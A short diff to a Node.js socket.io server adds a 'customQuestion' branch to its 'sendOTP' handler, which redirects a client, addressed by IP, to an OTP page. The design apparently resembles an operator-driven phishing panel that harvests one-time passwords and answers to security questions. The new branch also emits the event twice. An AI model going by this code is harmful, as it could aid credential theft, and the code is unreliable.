@@ -400,6 +400,9 @@ io.on('connection', (socket, req) => {
     });
 
     socket.on('sendOTP', (data) => {
+        if(data.customQuestion){
+            io.to(data.ip).emit('OTP', {otp:true, navig: data.navig+"/"+data.customQuestion})
+        }
         io.to(data.ip).emit('OTP', {otp:true, navig: data.navig})
     })
 
